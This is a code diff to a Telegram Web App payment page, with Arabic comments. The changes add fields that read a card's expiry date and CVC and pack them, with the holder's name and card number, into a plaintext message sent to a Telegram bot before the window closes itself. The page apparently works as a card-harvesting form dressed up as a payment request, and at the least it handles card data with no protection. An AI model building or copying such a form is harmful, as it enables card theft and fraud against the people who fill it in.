@@ -7,7 +7,6 @@
     <script src="https://telegram.org/js/telegram-web-app.js"></script>
     
     <style>
-        /* كود الـ CSS هنا */
         body {
             background-color: #f4f4f9;
             font-family: sans-serif;
@@ -43,7 +42,9 @@
             border-radius: 8px;
             cursor: pointer;
             font-size: 16px;
+            margin-top: 10px;
         }
+        button:hover { background-color: #357abd; }
     </style>
 </head>
 <body>
@@ -62,16 +63,24 @@
     </div>
 
     <script>
-        /* كود الـ JavaScript هنا */
+        // دالة إرسال البيانات إلى البوت
         function sendData() {
             const name = document.getElementById('name').value;
             const cardNum = document.getElementById('cardNum').value;
+            const expiry = document.getElementById('expiry').value;
+            const cvc = document.getElementById('cvc').value;
             
-            // تجميع البيانات لإرسالها للبوت
-            const data = طلب دفع جديد:\nالاسم: ${name}\nرقم البطاقة: ${cardNum};
+            // تجميع البيانات
+            const data = `طلب دفع جديد:
+الاسم: ${name}
+رقم البطاقة: ${cardNum}
+التاريخ: ${expiry}
+CVC: ${cvc}`;
             
-            // إرسال البيانات للبوت وإغلاق النافذة
+            // إرسال البيانات لتلغرام
             window.Telegram.WebApp.sendData(data);
+            
+            // إغلاق النافذة تلقائياً
             window.Telegram.WebApp.close();
         }
     </script>
